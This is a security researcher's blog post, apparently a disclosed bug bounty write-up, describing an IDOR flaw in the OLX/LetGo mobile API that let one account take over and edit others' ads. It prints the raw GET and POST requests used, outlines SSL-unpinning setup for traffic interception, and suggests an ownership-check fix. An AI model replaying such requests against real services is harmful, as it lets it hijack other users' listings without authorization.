@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Taking over every Ad on OLX (automated), an IDOR story</title>
+  <meta name="description" content="Public disclosure Hi again! Thank you for reading my third blog post. Happy to share all the details with you on the Insecure Direct Object Reference attack ...">
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html">
+  <link rel="alternate" type="application/rss+xml" title="kciredor&#39;s information security blog" href="/feed.xml">
+  
+  
+  <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-104198926-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+
+  
+</head>
+
+
+  <body>
+
+    <header class="site-header" role="banner">
+
+  <div class="wrapper">
+    
+    
+    <a class="site-title" href="/">kciredor&#39;s information security blog</a>
+  
+    
+  </div>
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Taking over every Ad on OLX (automated), an IDOR story</h1>
+    <p class="post-meta">
+      <time datetime="2017-10-18T15:30:00+02:00" itemprop="datePublished">
+        
+        Oct 18, 2017
+      </time>
+      </p>
+      <div class="post-sharing">
+  <a rel="noopener noreferrer nofollow" target="_blank" href="https://twitter.com/intent/tweet?text=&quot;Taking over every Ad on OLX (automated), an IDOR story&quot; by @kciredor_&url=https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html&related=kciredor_"><img src="/assets/icon_twitter.png" alt="Twitter" title=""></a>
+  <a rel="noopener noreferrer nofollow" target="_blank" href="http://www.reddit.com/submit?url=https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html&title=Taking over every Ad on OLX (automated), an IDOR story"><img src="/assets/icon_reddit.png" alt="Reddit" title=""></a>
+  <a rel="noopener noreferrer nofollow" target="_blank" href="http://www.linkedin.com/shareArticle?mini=true&url=https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html&title=Taking over every Ad on OLX (automated), an IDOR story&summary=Public disclosure Hi again! Thank you for reading my third blog post. Happy to share all the details with you on the Insecure Direct Object Reference attack ...&source=kciredor.com"><img src="/assets/icon_linkedin.png" alt="LinkedIn" title=""></a>
+  <a rel="noopener noreferrer nofollow" target="_blank" href="https://facebook.com/sharer.php?u=https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html"><img src="/assets/icon_facebook.png" alt="Facebook" title=""></a>
+  <a rel="noopener noreferrer nofollow" target="_blank" href="https://plus.google.com/share?url=https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html"><img src="/assets/icon_googleplus.png" alt="Google+" title=""></a>
+</div>
+
+      <p></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h1 id="public-disclosure">Public disclosure</h1>
+<p>Hi again! Thank you for reading my third blog post. Happy to share all the details with you on the Insecure Direct Object Reference attack (IDOR) as mentioned in my first blog. It has been resolved by OLX and publicly disclosed on HackerOne, meaning it’s time for a write-up!</p>
+
+<h1 id="some-context">Some context</h1>
+<p>OLX powers the LetGo website for a couple of countries including The Netherlands. LetGo is an eBay like website, allowing you to buy new stuff and let go of old stuff.</p>
+
+<p>You can probably imagine the excitement I felt finding out I could take over an ad uploaded by someone else and change the pricing and details. The changes will have to go through a manual approval process, but from my repeated experience this ends up fine. Especially for example changing prices from 40 to 35 euros will always go through. Also it appears that after several approvals my account got whitelisted and approvals were not required anymore.</p>
+
+<p>Because there was no rate limiting in place and the API supported walking through the full listing of all the ads, there was a potential for building a small script that does exactly that. Loop all the ads, take over each ad, change the pricing. This way it was possible to take over the entire collection of ads on the website.</p>
+
+<p>Of course it’s not a good idea to actually do so, no need to prove anything this severe and cause damage. So right after verifying the initial IDOR and the moment I saw the potential I reported the issue. Also note that I did not take over any ads that were not mine: always use multiple test accounts! Safety first.</p>
+
+<h1 id="how-i-found-the-idor">How I found the IDOR</h1>
+<p>Having OLX permission: full disclosure time!</p>
+
+<p>First of all we need to proxy the traffic coming from the iOS / Android apps. This traffic is SSL encrypted which is fine: just import the CA BurpSuite provisions for you. But nowadays some apps implement SSL pinning, meaning the BurpSuite CA does not work out of the box. You can bypass this added layer of protection by unpinning SSL. One way would be reverse engineering the app and patching out the checks, but a much easier way is to unpin system wide.</p>
+
+<p>So I have set up both a jailbroken iPad with SSL pinning disabled (using a cydia app) and an Android phone with SSL pinning disabled (using an Xposed module). This way you can always intercept traffic using a proxy like BurpSuite and (almost) any app. Note that you can just as easily set up Android emulators to accomplish the same goal (try genymotion or android studio).</p>
+
+<p>By intercepting the API calls during browsing of your iOS and Android apps, you can learn about-, change- and repeat API calls.</p>
+
+<p>Setup test accounts:</p>
+<ul>
+  <li>Android account: token ‘111111’</li>
+  <li>iOS     account: token ‘222222’</li>
+</ul>
+
+<p>ACCOUNT_1:</p>
+<ol>
+  <li>Post a new ad using token ‘111111’ (returns the ID, in this test case: 888888).</li>
+  <li>Wait for approval</li>
+  <li>Approved and published on site</li>
+</ol>
+
+<p>ACCOUNT_2:</p>
+<ol>
+  <li>Fetch advertisement list through a search api call</li>
+  <li>Attack an ad by doing a POST call (picked the newly posted 888888 here).</li>
+  <li>The takeover of the ad is instant: it’s now in ACCOUNT_2, not in ACCOUNT_1 anymore</li>
+  <li>Wait for approval</li>
+  <li>Approved and published on site with my changes</li>
+</ol>
+
+<p>The attack - using ACCOUNT_2 - involves two api calls: GET /i2/ajax/ads/ (to get id’s) and POST /i2/newadding/ (to take over and make changes).</p>
+
+<p>The GET call lists all the ads including id’s (paginated) and looks like this:</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">GET /i2/ajax/ads/?json=1<span class="err">&amp;</span>app\_ios=285<span class="err">&amp;</span>brand=Letgo<span class="err">&amp;</span>client=ios<span class="err">&amp;</span>version=285<span class="err">&amp;</span>token=222222<span class="err">&amp;</span>location=1,1<span class="err">&amp;</span>lang=en<span class="err">&amp;</span>search%5Blat%5D=1<span class="err">&amp;</span>search%5Blon%5D=1<span class="err">&amp;</span>search%5Border%5D=dist<span class="err">&amp;</span>search%5Bdistance%5D=20000 HTTP/1.1
+Host: letgonl-a.akamaihd.net
+Connection: close
+Accept: */*
+User-Agent: Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1           Accept-Language: en-NL;q=1.0, nl-NL;q=0.9
+X-Origin-OLX: production</code></pre></figure>
+
+<p>The POST call - the actual attack / IDOR - looks like this:</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">POST /i2/newadding/?json=1<span class="err">&amp;</span>app_ios=285<span class="err">&amp;</span>brand=Letgo<span class="err">&amp;</span>client=ios<span class="err">&amp;</span>version=285<span class="err">&amp;</span>token=222222<span class="err">&amp;</span>location=1,1<span class="err">&amp;</span>lang=en HTTP/1.1
+Host: letgonl-a.akamaihd.net
+Content-Type: application/json
+Content-Length: 222
+Accept: */*
+Connection: close
+User-Agent: Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+Accept-Language: en-NL;q=1.0, nl-NL;q=0.9
+X-Origin-OLX: production
+
+{"ad_id":888888,"params":{"price":"35"},"description":"This is awesome","person":"nickname","title":"My title","category_id":"800","locations":[{"map_lon":1,"map_lat":2}]}</code></pre></figure>
+
+<p>Note that I’m just repeating the GET and POST calls I intercepted, replacing the token from ACCOUNT_1 with the token from ACCOUNT_2.</p>
+
+<p>Again I would like to emphasize you must always use test accounts, never cause damage, think before you act. It’s a lot of fun, but it’s not a game!</p>
+
+<p>My suggested fix was: ‘The update POST call does check for something like “is_authenticated()” but it appears it does not check for “is_authorized()”, which in turn could implement something like “is_owner()”.’</p>
+
+<h1 id="lessons-learned">Lessons learned</h1>
+<ol>
+  <li>Focus on bug bounty programs with a good track record. Chasing should not be nescessary, it’s a two way street. And #NoFreeBugs.</li>
+  <li>Know when to stop attacking one specific issue or platform. Got stuck? Keep on moving! Write down your notes on what you have found so far and come back later.</li>
+</ol>
+
+<p>Let’s keep on hacking!</p>
+
+<p>Cheers,
+kciredor</p>
+
+  </div>
+
+  <div class="post-sharing">
+  <a rel="noopener noreferrer nofollow" target="_blank" href="https://twitter.com/intent/tweet?text=&quot;Taking over every Ad on OLX (automated), an IDOR story&quot; by @kciredor_&url=https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html&related=kciredor_"><img src="/assets/icon_twitter.png" alt="Twitter" title=""></a>
+  <a rel="noopener noreferrer nofollow" target="_blank" href="http://www.reddit.com/submit?url=https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html&title=Taking over every Ad on OLX (automated), an IDOR story"><img src="/assets/icon_reddit.png" alt="Reddit" title=""></a>
+  <a rel="noopener noreferrer nofollow" target="_blank" href="http://www.linkedin.com/shareArticle?mini=true&url=https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html&title=Taking over every Ad on OLX (automated), an IDOR story&summary=Public disclosure Hi again! Thank you for reading my third blog post. Happy to share all the details with you on the Insecure Direct Object Reference attack ...&source=kciredor.com"><img src="/assets/icon_linkedin.png" alt="LinkedIn" title=""></a>
+  <a rel="noopener noreferrer nofollow" target="_blank" href="https://facebook.com/sharer.php?u=https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html"><img src="/assets/icon_facebook.png" alt="Facebook" title=""></a>
+  <a rel="noopener noreferrer nofollow" target="_blank" href="https://plus.google.com/share?url=https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html"><img src="/assets/icon_googleplus.png" alt="Google+" title=""></a>
+</div>
+
+  <p></p>
+
+  
+    
+
+  <div id="disqus_thread"></div>
+  <script>
+    var disqus_config = function () {
+      this.page.url = 'https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html';
+      this.page.identifier = 'https://kciredor.com/taking-over-every-ad-on-olx-automated-an-idor-story.html';
+    };
+
+    (function() {
+      var d = document, s = d.createElement('script');
+
+      s.src = 'https://kciredor.disqus.com/embed.js';
+
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+  
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">kciredor&#39;s information security blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li>
+            
+              Roderick Schaefer
+            
+            </li>
+            
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          <li><a href="https://twitter.com/kciredor_" target="_blank" rel="nofollow noopener noreferrer">twitter</a></li>
+          <li><a href="https://github.com/kciredor" target="_blank" rel="nofollow noopener noreferrer">github</a></li>
+          <li><a href="https://wehandle.it/" target="_blank" rel="nofollow noopener noreferrer">company</a></li>
+          <li><a href="https://www.linkedin.com/in/roderickschaefer/" target="_blank" rel="nofollow noopener noreferrer">linkedin</a></li>
+          <li><a href="https://hackerone.com/kciredor" target="_blank" rel="nofollow noopener noreferrer">hackerone</a></li>
+          <li><a href="https://bugcrowd.com/kciredor" target="_blank" rel="nofollow noopener noreferrer">bugcrowd</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>Security researcher. Software engineer. Independent. This blog features my write-up&#39;s on interesting research and security findings. Make sure you follow me on Twitter @kciredor_ to stay up to date on new posts!
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
